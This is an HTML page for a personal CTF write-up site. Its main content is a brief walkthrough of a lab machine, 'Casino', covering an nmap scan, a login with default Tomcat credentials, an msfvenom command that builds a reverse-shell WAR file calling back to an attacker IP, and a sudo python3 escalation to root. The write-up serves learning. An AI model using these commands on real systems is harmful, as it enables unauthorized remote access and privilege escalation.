<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MyBitByte – Writeups</title>

    <!-- Font Awesome for icons (CDN) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />

    <style>
        /* ============================================================
           RESET & BASE
           ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111;
            --bg-sidebar: #0d0d0d;
            --text-primary: #00ff41;
            --text-secondary: #b9f6ca;
            --text-muted: #69f0ae;
            --border-color: #00ff41;
            --shadow-color: rgba(0, 255, 65, 0.15);
            --accent: #00e676;
            --font-mono: 'Courier New', monospace;
            --font-sans: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* Light mode (optional) */
        body.light {
            --bg-primary: #f5f5f5;
            --bg-secondary: #e8e8e8;
            --bg-sidebar: #f0f0f0;
            --text-primary: #1a1a1a;
            --text-secondary: #333;
            --text-muted: #555;
            --border-color: #ccc;
            --shadow-color: rgba(0, 0, 0, 0.1);
        }

        html,
        body {
            height: 100%;
            background: var(--bg-primary);
            color: var(--text-secondary);
            font-family: var(--font-sans);
            transition: background 0.3s, color 0.3s;
        }

        /* ============================================================
           LAYOUT
           ============================================================ */
        .app {
            display: flex;
            height: 100vh;
            overflow: hidden;
        }

        /* ── Sidebar ── */
        .sidebar {
            width: 280px;
            background: var(--bg-sidebar);
            border-right: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            padding: 1.2rem 0;
            flex-shrink: 0;
            overflow-y: auto;
            transition: width 0.3s;
        }

        .sidebar-header {
            padding: 0 1.2rem 1rem 1.2rem;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 1rem;
        }

        .sidebar-header h1 {
            font-size: 1.5rem;
            color: var(--text-primary);
            font-family: var(--font-mono);
        }

        .sidebar-header h1 i {
            color: var(--accent);
        }

        .sidebar-search {
            padding: 0 1.2rem 1rem 1.2rem;
        }

        .sidebar-search input {
            width: 100%;
            padding: 0.5rem 0.8rem;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-secondary);
            font-family: inherit;
            outline: none;
        }

        .sidebar-search input::placeholder {
            color: var(--text-muted);
            opacity: 0.6;
        }

        .sidebar-search input:focus {
            border-color: var(--accent);
        }

        /* ── Navigation ── */
        .nav {
            flex: 1;
            overflow-y: auto;
            padding: 0 0.5rem;
        }

        .nav ul {
            list-style: none;
        }

        .nav li {
            margin-bottom: 0.2rem;
        }

        .nav a {
            display: block;
            padding: 0.4rem 0.8rem;
            color: var(--text-muted);
            text-decoration: none;
            border-radius: 4px;
            font-size: 0.9rem;
            transition: all 0.2s;
        }

        .nav a:hover,
        .nav a.active {
            background: var(--border-color);
            color: var(--bg-primary);
        }

        .nav .section-title {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-muted);
            opacity: 0.6;
            padding: 0.8rem 0.8rem 0.2rem 0.8rem;
            font-weight: bold;
        }

        .nav .sub-items {
            padding-left: 1.2rem;
        }

        .nav .sub-items a {
            font-size: 0.85rem;
        }

        /* ── Main Content ── */
        .main {
            flex: 1;
            overflow-y: auto;
            padding: 2rem 3rem;
            background: var(--bg-primary);
        }

        .main h1 {
            color: var(--text-primary);
            font-family: var(--font-mono);
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 0.5rem;
            margin-bottom: 1.5rem;
            font-size: 2.2rem;
        }

        .main h2 {
            color: var(--accent);
            margin: 2rem 0 1rem 0;
            border-left: 4px solid var(--border-color);
            padding-left: 1rem;
        }

        .main h3 {
            color: var(--text-muted);
            margin: 1.5rem 0 0.8rem 0;
        }

        .main p {
            line-height: 1.7;
            margin-bottom: 1rem;
        }

        .main code {
            background: var(--bg-secondary);
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-family: var(--font-mono);
            font-size: 0.9rem;
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }

        .main pre {
            background: var(--bg-secondary);
            padding: 1.2rem;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            overflow-x: auto;
            margin: 1rem 0;
            color: var(--text-secondary);
            font-family: var(--font-mono);
            font-size: 0.85rem;
        }

        .main pre code {
            background: transparent;
            border: none;
            padding: 0;
            color: inherit;
        }

        .main ul,
        .main ol {
            padding-left: 2rem;
            margin-bottom: 1rem;
        }

        .main table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0;
        }

        .main table th,
        .main table td {
            border: 1px solid var(--border-color);
            padding: 0.5rem 0.8rem;
            text-align: left;
        }

        .main table th {
            background: var(--bg-secondary);
            color: var(--text-primary);
        }

        .main a {
            color: var(--accent);
            text-decoration: none;
            border-bottom: 1px dotted var(--accent);
        }

        .main a:hover {
            color: var(--text-primary);
        }

        /* ── Theme Toggle ── */
        .theme-toggle {
            position: fixed;
            bottom: 1.5rem;
            right: 1.5rem;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 50%;
            width: 44px;
            height: 44px;
            color: var(--text-primary);
            font-size: 1.2rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
            z-index: 100;
        }

        .theme-toggle:hover {
            background: var(--border-color);
            color: var(--bg-primary);
        }

        /* ── Responsive ── */
        @media (max-width: 768px) {
            .sidebar {
                width: 0;
                padding: 0;
                overflow: hidden;
                border: none;
            }
            .sidebar.open {
                width: 280px;
                padding: 1.2rem 0;
                border-right: 1px solid var(--border-color);
                position: fixed;
                top: 0;
                left: 0;
                height: 100%;
                background: var(--bg-sidebar);
                z-index: 50;
                overflow-y: auto;
            }
            .main {
                padding: 1.5rem;
            }
            .menu-toggle {
                display: block !important;
            }
        }

        .menu-toggle {
            display: none;
            position: fixed;
            top: 1rem;
            left: 1rem;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 0.4rem 0.8rem;
            color: var(--text-primary);
            font-size: 1.2rem;
            cursor: pointer;
            z-index: 60;
        }

        /* Hide scrollbar for cleaner look */
        .sidebar::-webkit-scrollbar,
        .main::-webkit-scrollbar {
            width: 4px;
        }
        .sidebar::-webkit-scrollbar-thumb,
        .main::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }
    </style>
</head>
<body>

    <!-- ─── Mobile Menu Toggle ─── -->
    <button class="menu-toggle" id="menuToggle">
        <i class="fas fa-bars"></i>
    </button>

    <!-- ─── Theme Toggle ─── -->
    <button class="theme-toggle" id="themeToggle" title="Toggle light/dark mode">
        <i class="fas fa-moon"></i>
    </button>

    <div class="app">

        <!-- ─── SIDEBAR ─── -->
        <aside class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <h1><i class="fas fa-terminal"></i> MyBitByte</h1>
            </div>

            <div class="sidebar-search">
                <input type="text" id="searchInput" placeholder="Search docs..." />
            </div>

            <nav class="nav" id="nav">
                <ul>
                    <li class="section-title">Writeups</li>
                    <li><a href="#" data-page="home" class="active"><i class="fas fa-home"></i> Home</a></li>

                    <li class="section-title">HackTheBox</li>
                    <li><a href="#" data-page="htb-box1">Box 1 – Easy</a></li>
                    <li><a href="#" data-page="htb-box2">Box 2 – Medium</a></li>

                    <li class="section-title">HackSmarter</li>
                    <li>
                        <a href="#" data-page="hacksmarter-casino"><i class="fas fa-chevron-right"></i> Casino</a>
                    </li>
                    <li>
                        <a href="#" data-page="hacksmarter-box2">Box 2 – Coming soon</a>
                    </li>

                    <li class="section-title">Resources</li>
                    <li><a href="#" data-page="tools">Tools</a></li>
                    <li><a href="#" data-page="about">About</a></li>
                </ul>
            </nav>
        </aside>

        <!-- ─── MAIN CONTENT ─── -->
        <main class="main" id="mainContent">
            <!-- Content is injected here by JavaScript -->
        </main>

    </div>

    <script>
        // ============================================================
        // PAGE CONTENT (Markdown-like HTML)
        // ============================================================

        const pages = {

            home: `
            <h1>🖥️ MyBitByte – Writeups</h1>

            <p>Welcome to my cybersecurity writeup hub. Here you'll find detailed walkthroughs for machines from HackTheBox, HackSmarter, and other CTF platforms.</p>

            <p style="color: var(--text-primary); font-family: var(--font-mono);">
            <i class="fas fa-terminal"></i> root@mybitbyte:~$ whoami
            </p>
            <p>Cybersecurity Engineer | Penetration Tester</p>

            <h2>📖 Latest Writeups</h2>
            <ul>
                <li><a href="#" data-page="hacksmarter-casino">HackSmarter – Casino</a></li>
                <li><a href="#" data-page="htb-box1">HackTheBox – Box 1</a></li>
            </ul>

            <h2>🔧 Tools I Use</h2>
            <ul>
                <li>Nmap</li>
                <li>Burp Suite</li>
                <li>Metasploit</li>
                <li>Gobuster</li>
                <li>John the Ripper</li>
            </ul>

            <p>Check out the sidebar for more.</p>
            `,

            'hacksmarter-casino': `
            <h1>🎰 HackSmarter – Casino</h1>

            <h2>Machine Overview</h2>
            <table>
                <tr><th>Detail</th><th>Value</th></tr>
                <tr><td>Platform</td><td>HackSmarter Labs</td></tr>
                <tr><td>Machine</td><td>Casino</td></tr>
                <tr><td>Difficulty</td><td>Medium</td></tr>
                <tr><td>Date</td><td>2024-08-26</td></tr>
            </table>

            <h2>Reconnaissance</h2>
            <h3>Nmap Scan</h3>
            <pre><code>nmap -sV -sC -p- -T4 10.10.x.x</code></pre>
            <p><strong>Results:</strong></p>
            <pre><code>PORT     STATE SERVICE     VERSION
        22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2
        80/tcp   open  http        Apache httpd 2.4.38
        8080/tcp open  http        Apache Tomcat 9.0.31</code></pre>

            <h2>Exploitation</h2>
            <h3>Step 1 – Tomcat Manager</h3>
            <p>Default credentials <code>admin:admin</code> worked on the Tomcat Manager at <code>/manager/html</code>.</p>
            <pre><code>curl -u admin:admin http://10.10.x.x:8080/manager/html</code></pre>
            <p>Deploy a malicious WAR file using <code>msfvenom</code>:</p>
            <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f war -o shell.war</code></pre>
            <p>Upload and deploy – reverse shell received.</p>

            <h3>Step 2 – Privilege Escalation</h3>
            <p>Check sudo rights:</p>
            <pre><code>sudo -l</code></pre>
            <p>We can run <code>/usr/bin/python3</code> with no password. Exploit:</p>
            <pre><code>sudo python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
            <p>Now we are root.</p>

            <h2>Flags</h2>
            <table>
                <tr><th>Flag</th><th>Hash</th></tr>
                <tr><td>User</td><td><code>flag{user_...}</code></td></tr>
                <tr><td>Root</td><td><code>flag{root_...}</code></td></tr>
            </table>

            <h2>Lessons Learned</h2>
            <ul>
                <li>Always try default credentials on management interfaces.</li>
                <li>Tomcat manager can be a quick win.</li>
                <li>Check <code>sudo -l</code> for privilege escalation vectors.</li>
            </ul>

            <p><a href="#" data-page="home">← Back to Home</a></p>
            `,

            'htb-box1': `
            <h1>🔓 HackTheBox – Box 1 (Easy)</h1>
            <p>Coming soon – this is a placeholder for your HTB writeup.</p>
            <p><a href="#" data-page="home">← Back to Home</a></p>
            `,

            'htb-box2': `
            <h1>🔓 HackTheBox – Box 2 (Medium)</h1>
            <p>Coming soon.</p>
            <p><a href="#" data-page="home">← Back to Home</a></p>
            `,

            tools: `
            <h1>🛠️ Security Tools</h1>
            <ul>
                <li><strong>Nmap</strong> – Network scanning</li>
                <li><strong>Burp Suite</strong> – Web proxy & testing</li>
                <li><strong>Metasploit</strong> – Exploitation framework</li>
                <li><strong>Gobuster</strong> – Directory busting</li>
                <li><strong>John the Ripper</strong> – Password cracking</li>
                <li><strong>Wireshark</strong> – Packet analysis</li>
            </ul>
            <p><a href="#" data-page="home">← Back to Home</a></p>
            `,

            about: `
            <h1>📄 About</h1>
            <p>This site is a collection of my cybersecurity writeups and resources.</p>
            <p>I'm a passionate security researcher with a focus on penetration testing and red teaming.</p>
            <p>Connect with me on <a href="https://github.com/donmedfor" target="_blank">GitHub</a>.</p>
            <p><a href="#" data-page="home">← Back to Home</a></p>
            `
        };

        // ============================================================
        // RENDER ENGINE
        // ============================================================

        const main = document.getElementById('mainContent');
        const navLinks = document.querySelectorAll('.nav a[data-page]');
        const searchInput = document.getElementById('searchInput');
        const sidebar = document.getElementById('sidebar');
        const menuToggle = document.getElementById('menuToggle');

        // ── Render a page ──
        function renderPage(pageId) {
            const content = pages[pageId] || `<h1>404</h1><p>Page not found.</p>`;
            main.innerHTML = content;

            // Highlight active link
            navLinks.forEach(link => link.classList.remove('active'));
            const activeLink = document.querySelector(`.nav a[data-page="${pageId}"]`);
            if (activeLink) activeLink.classList.add('active');

            // Update URL hash (optional)
            if (history.pushState) {
                history.pushState(null, '', `#${pageId}`);
            }

            // Close mobile sidebar after navigation
            if (window.innerWidth <= 768) {
                sidebar.classList.remove('open');
            }

            // Re-bind clicks on internal links (for navigation)
            main.querySelectorAll('a[data-page]').forEach(link => {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    renderPage(link.dataset.page);
                });
            });
        }

        // ── Search ──
        searchInput.addEventListener('input', function() {
            const query = this.value.toLowerCase().trim();
            const links = document.querySelectorAll('.nav a[data-page]');
            links.forEach(link => {
                const text = link.textContent.toLowerCase();
                const parent = link.closest('li');
                if (text.includes(query) || query === '') {
                    parent.style.display = '';
                } else {
                    parent.style.display = 'none';
                }
            });
        });

        // ── Handle nav clicks ──
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                renderPage(link.dataset.page);
            });
        });

        // ── Mobile menu toggle ──
        menuToggle.addEventListener('click', () => {
            sidebar.classList.toggle('open');
        });

        // ── Theme toggle ──
        const themeToggle = document.getElementById('themeToggle');
        themeToggle.addEventListener('click', () => {
            document.body.classList.toggle('light');
            const icon = themeToggle.querySelector('i');
            if (document.body.classList.contains('light')) {
                icon.className = 'fas fa-sun';
            } else {
                icon.className = 'fas fa-moon';
            }
        });

        // ── Load initial page from URL hash ──
        function loadFromHash() {
            const hash = window.location.hash.replace('#', '');
            const page = pages[hash] ? hash : 'home';
            renderPage(page);
        }

        window.addEventListener('hashchange', loadFromHash);
        loadFromHash();

        // ── Click outside sidebar closes it on mobile ──
        document.addEventListener('click', (e) => {
            if (window.innerWidth <= 768) {
                if (!sidebar.contains(e.target) && e.target !== menuToggle) {
                    sidebar.classList.remove('open');
                }
            }
        });

        console.log('🟢 MyBitByte – Writeups loaded.');
    </script>

</body>
</html>
